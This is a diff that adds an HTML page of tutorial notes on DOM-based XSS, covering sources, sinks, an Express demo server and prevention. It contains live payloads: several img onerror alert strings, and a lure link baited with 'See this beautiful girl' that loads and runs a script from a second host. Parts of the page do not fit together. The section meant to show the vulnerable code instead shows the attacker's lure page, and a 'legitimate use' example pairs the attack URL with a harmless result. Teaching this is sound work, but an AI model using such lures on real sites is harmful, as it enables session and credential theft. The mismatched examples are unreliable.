@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>DOM-Based XSS Attack Notes</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      /* General Styles */
+      body {
+        font-family: 'Nunito', sans-serif;
+        background-color: #1e1e1e; /* Dark Gray / Near Black */
+        color: #d4d4d4; /* Light Gray for main text */
+        line-height: 1.6;
+        padding: 20px;
+        margin: 0;
+      }
+
+      .container {
+        max-width: 900px;
+        margin: 0 auto;
+        background-color: #252526; /* Slightly lighter body for contrast */
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+      }
+
+      h1,
+      h2,
+      h3 {
+        color: #569cd6; /* VS Code Blue/Purple */
+        border-bottom: 2px solid #3c3c3c;
+        padding-bottom: 5px;
+        margin-top: 30px;
+      }
+
+      h2 {
+        font-size: 1.8em;
+      }
+      h3 {
+        font-size: 1.4em;
+        color: #4ec9b0; /* VS Code Green */
+      }
+
+      strong {
+        color: #dcdcaa; /* VS Code Yellow */
+        font-weight: 700;
+      }
+
+      /* List Styling */
+      ul {
+        list-style-type: '⚡ ';
+        padding-left: 20px;
+      }
+      li {
+        margin-bottom: 10px;
+      }
+
+      /* Code Block Styling (VS Code Theme) */
+      pre {
+        background-color: #1e1e1e; /* VS Code Editor Background */
+        color: #d4d4d4; /* Default Text */
+        padding: 15px;
+        border-radius: 4px;
+        overflow-x: auto;
+        font-family: 'Consolas', 'Monaco', monospace;
+        border: 1px solid #3c3c3c;
+        margin-top: 15px;
+        margin-bottom: 15px;
+      }
+
+      /* Specific Code Highlighting */
+      .keyword {
+        color: #c586c0;
+      } /* Purple for keywords (const, import, if) */
+      .string {
+        color: #ce9178;
+      } /* Orange for strings/URLs */
+      .comment {
+        color: #6a9955;
+      } /* Green for comments */
+      .variable {
+        color: #9cdcfe;
+      } /* Light Blue for variables/functions */
+      .tag {
+        color: #569cd6;
+      } /* Blue for HTML tags */
+      .attribute {
+        color: #4ec9b0;
+      } /* Green for HTML attributes */
+      .operator {
+        color: #d4d4d4;
+      }
+      .number {
+        color: #b5cea8;
+      } /* Light Green for numbers */
+
+      /* Inline Code */
+      code {
+        background-color: #3c3c3c;
+        color: #dcdcaa;
+        padding: 2px 4px;
+        border-radius: 3px;
+        font-family: 'Consolas', 'Monaco', monospace;
+        font-size: 0.95em;
+      }
+
+      .section-icon {
+        margin-right: 10px;
+        color: #ffd700; /* Gold */
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h2 id="understanding-dom-based-xss">
+        <span class="section-icon">🛡️</span> Understanding DOM-Based XSS
+      </h2>
+      <p>
+        <strong>DOM-Based XSS</strong> is a type of XSS attack where the
+        vulnerability exists entirely on the <strong>client side</strong>. The
+        malicious payload is executed when the client's script writes
+        user-controllable data to the
+        <strong>Document Object Model (DOM)</strong> in an unsafe way.
+      </p>
+
+      <h3>Key Concepts</h3>
+      <ul>
+        <li>
+          <strong>DOM (Document Object Model):</strong> This is a programming
+          interface for web documents. It represents the page so that programs
+          (like JavaScript) can change the document structure, style, and
+          content.
+        </li>
+        <li>
+          <strong>Source:</strong> The location where user-supplied data is read
+          (<code class="variable"
+            >e.g., document.location.hash, document.location.search,
+            document.cookie</code
+          >).
+        </li>
+        <li>
+          <strong>Sink:</strong> The dangerous function or property that can
+          cause the execution of malicious code if it writes unsanitized data to
+          the DOM (<code class="variable"
+            >e.g., element.innerHTML, document.write(), element.outerHTML</code
+          >).
+        </li>
+      </ul>
+
+      <h3>How It Works</h3>
+      <ul>
+        <li>
+          <strong>Input:</strong> An attacker crafts a malicious URL that
+          includes the payload, typically in the fragment (<code
+            class="operator"
+            >#</code
+          >) or query string (<code class="operator">?</code>) portion.
+          <pre><span class="comment">// Example URL:</span>
+<span class="string">https://vulnerable-app.com/page.html#name=&lt;script&gt;alert('XSS')&lt;/script&gt;</span></pre>
+        </li>
+        <li>
+          <strong>Unsafe Script:</strong> The victim clicks this link. The
+          legitimate client-side JavaScript on
+          <code class="string">page.html</code> reads the data from the URL (the
+          <strong>source</strong>) and then uses a vulnerable function (the
+          <strong>sink</strong>) to insert that data into the HTML page
+          <strong>without properly sanitizing it</strong>.
+        </li>
+        <li>
+          <strong>Execution:</strong> The browser sees the inserted data, which
+          includes the <code class="tag">&lt;script&gt;</code> tag. Because the
+          browser trusts its own page, it executes the inserted script.
+        </li>
+        <li>
+          <strong>Consequence:</strong> The attacker's script executes in the
+          context of the victim's session, allowing them to perform actions like
+          stealing session cookies, performing actions on the user's behalf, or
+          redirecting the user.
+        </li>
+      </ul>
+
+      <hr />
+
+      <h2 id="analogy">
+        <span class="section-icon">🎯</span> DOM-Based XSS: A Simple Analogy
+      </h2>
+      <p>
+        Imagine a fast-food restaurant with a digital
+        <strong>"Welcome" board</strong>.
+      </p>
+      <ul>
+        <li>
+          <strong>Normal Process:</strong> A manager types "Welcome, John!" into
+          the system. The board displays the text safely.
+        </li>
+        <li>
+          <strong>Vulnerability:</strong> The system for updating the board is
+          sloppy. Instead of just displaying the text, it allows the manager to
+          input raw <strong>HTML code</strong>.
+        </li>
+        <li>
+          <strong>The Attack:</strong> An attacker sends the restaurant a
+          message that says, "Welcome, John! Please insert a hidden ad here:
+          <code class="tag"
+            >&lt;script&gt;stealCreditCards()&lt;/script&gt;</code
+          >"
+        </li>
+        <li>
+          <strong>Result:</strong> The sloppy system takes that entire string
+          and
+          <strong
+            >tries to execute the
+            <code class="tag">&lt;script&gt;</code></strong
+          >
+          as part of the board's display logic.
+        </li>
+      </ul>
+
+      <hr />
+
+      <h2 id="practical-conceptual-example">
+        <span class="section-icon">💻</span> Practical (Conceptual) Example
+      </h2>
+      <p>
+        While the attack is client-side, a server (like Express.js) is required
+        to serve the vulnerable HTML and JavaScript.
+      </p>
+
+      <h3>1. Express.js Server Setup</h3>
+      <p>An Express.js server simply serves the vulnerable HTML file.</p>
+      <pre>
+<span class="keyword">import</span> <span class="variable">express</span> <span class="keyword">from</span> <span class="string">"express"</span>;
+
+<span class="keyword">const</span> <span class="variable">app</span> <span class="operator">=</span> <span class="variable">express</span>();
+<span class="keyword">const</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">3000</span>;
+
+<span class="variable">app</span>.<span class="variable">use</span>((<span class="variable">req</span>, <span class="variable">res</span>, <span class="variable">next</span>) <span class="operator">=></span> {
+  <span class="variable">console</span>.<span class="variable">log</span>(<span class="variable">req</span>.<span class="variable">url</span>);
+  <span class="variable">next</span>();
+});
+
+<span class="variable">app</span>.<span class="variable">use</span>(<span class="variable">express</span>.<span class="variable">static</span>(<span class="string">"./public"</span>));
+
+<span class="variable">app</span>.<span class="variable">listen</span>(<span class="variable">port</span>, () <span class="operator">=></span> {
+  <span class="variable">console</span>.<span class="variable">log</span>(<span class="string">`DOM XSS demo running at http://localhost:${port}`</span>);
+});
+    </pre>
+
+      <h3>2. The Vulnerable Client-Side Code</h3>
+      <p>
+        In the <code class="string">Vulnerable . file</code>, a script reads
+        from <code class="variable">location.hash</code> (the URL fragment) and
+        injects it directly into the DOM using the dangerous
+        <code class="variable">innerHTML</code> sink.
+      </p>
+      <pre>
+<span class="tag">&lt;!DOCTYPE html&gt;</span>
+<span class="tag">&lt;html</span> <span class="attribute">lang</span><span class="operator">="en"</span><span class="tag">&gt;</span>
+  <span class="tag">&lt;head&gt;</span>
+    <span class="tag">&lt;meta</span> <span class="attribute">charset</span><span class="operator">="UTF-8"</span> <span class="tag">/&gt;</span>
+    <span class="tag">&lt;meta</span> <span class="attribute">name</span><span class="operator">="viewport"</span> <span class="attribute">content</span><span class="operator">="width=device-width, initial-scale=1.0"</span> <span class="tag">/&gt;</span>
+    <span class="tag">&lt;title&gt;</span>Beautiful Link Demo<span class="tag">&lt;/title&gt;</span>
+
+    <span class="comment">&lt;!-- Tailwind CDN --&gt;</span>
+    <span class="tag">&lt;script</span> <span class="attribute">src</span><span class="operator">="https://cdn.tailwindcss.com"</span><span class="tag">&gt;&lt;/script&gt;</span>
+  <span class="tag">&lt;/head&gt;</span>
+
+  <span class="tag">&lt;body</span>
+    <span class="attribute">class</span><span class="operator">="bg-gradient-to-br from-indigo-600 via-purple-600 to-pink-500 min-h-screen flex items-center justify-center p-6"</span>
+  <span class="tag">&gt;</span>
+    <span class="tag">&lt;div</span>
+      <span class="attribute">class</span><span class="operator">="bg-white/20 backdrop-blur-lg p-10 rounded-3xl shadow-2xl border border-white/30 max-w-xl text-center"</span>
+    <span class="tag">&gt;</span>
+      <span class="tag">&lt;h1</span> <span class="attribute">class</span><span class="operator">="text-4xl font-extrabold text-white drop-shadow-lg mb-6"</span><span class="tag">&gt;</span>
+        🌸 Beautiful Link Demo 🌸
+      <span class="tag">&lt;/h1&gt;</span>
+
+      <span class="tag">&lt;p</span> <span class="attribute">class</span><span class="operator">="text-white/90 text-lg mb-8"</span><span class="tag">&gt;</span>
+        Click the link below if you want to see something beautiful!
+      <span class="tag">&lt;/p&gt;</span>
+
+      <span class="tag">&lt;a</span>
+        <span class="attribute">href</span><span class="operator">="http://localhost:3000/#arman%20%3Cimg%20src%20onerror='const%20s%20=%20document.createElement(%22script%22);%20s.src%20=%20%22http://localhost:8000/script.js%22;%20document.body.appendChild(s)'%20/%3E"</span>
+        <span class="attribute">class</span><span class="operator">="inline-block bg-white text-indigo-600 font-semibold px-6 py-3 rounded-full shadow-lg hover:scale-105 hover:shadow-2xl transition-all duration-300"</span>
+      <span class="tag">&gt;</span>
+        💖 See this beautiful girl 💖
+      <span class="tag">&lt;/a&gt;</span>
+    <span class="tag">&lt;/div&gt;</span>
+  <span class="tag">&lt;/body&gt;</span>
+<span class="tag">&lt;/html&gt;</span>
+    </pre>
+
+      <h3>3. The Attack Vector</h3>
+      <ul>
+        <li>
+          <strong>Legitimate Use (Output Example):</strong> If a user visits
+          <code class="string"
+            >http://localhost:3000/#arman%20%3Cimg%20src%20onerror='const%20s%20=%20document.createElement(%22script%22);%20s.src%20=%20%22http://localhost:8000/script.js%22;%20document.body.appendChild(s)'%20/%3E</code
+          >, the user-greeting span becomes:
+          <code class="tag"
+            >&lt;span id="user-greeting"&gt;Alice&lt;/span&gt;</code
+          >
+          (Output: Welcome, Alice!)
+        </li>
+        <li>
+          <strong>Attacker's Payload:</strong> The attacker sends the victim a
+          URL like this:
+          <pre><span class="string">http://localhost:3000/#&lt;img src=x onerror=alert('XSS')&gt;</span></pre>
+        </li>
+        <li>
+          <strong>What Happens:</strong>
+          <ul>
+            <li>
+              The client-side script reads
+              <code class="variable">nameParam</code> as
+              <code class="tag">&lt;img src=x onerror=alert('XSS')&gt;</code>.
+            </li>
+            <li>
+              It executes:
+              <code class="variable"
+                >document.getElementById('user-greeting').innerHTML = "&lt;img
+                src=x onerror=alert('XSS')&gt;"</code
+              >.
+            </li>
+            <li>
+              The **DOM is updated**, creating an
+              <code class="tag">&lt;img&gt;</code> tag.
+            </li>
+            <li>
+              The browser attempts to load the image (<code class="attribute"
+                >src=x</code
+              >), which fails, triggering the
+              <code class="attribute">onerror</code> event.
+            </li>
+            <li>
+              The malicious JavaScript code,
+              <code class="variable">alert('XSS')</code>, executes in the
+              victim's browser.
+            </li>
+          </ul>
+        </li>
+      </ul>
+
+      <hr />
+
+      <h2 id="prevention"><span class="section-icon">✅</span> Prevention</h2>
+      <p>
+        The key to preventing DOM-Based XSS is to **never write unsanitized,
+        user-controllable data to a dangerous sink**.
+      </p>
+
+      <ul>
+        <li>
+          <strong>Avoid Dangerous Sinks:</strong> Whenever possible, avoid sinks
+          like <code class="variable">innerHTML, document.write()</code>, and
+          <code class="variable">outerHTML</code> for user-supplied data.
+        </li>
+        <li>
+          <strong>Use Safe Properties:</strong> If you only need to update text
+          content, use <code class="variable">.textContent</code> or
+          <code class="variable">.innerText</code> instead of
+          <code class="variable">.innerHTML</code>. These properties
+          automatically treat the input as raw text, preventing the browser from
+          parsing it as HTML.
+        </li>
+      </ul>
+    </div>
+  </body>
+</html>
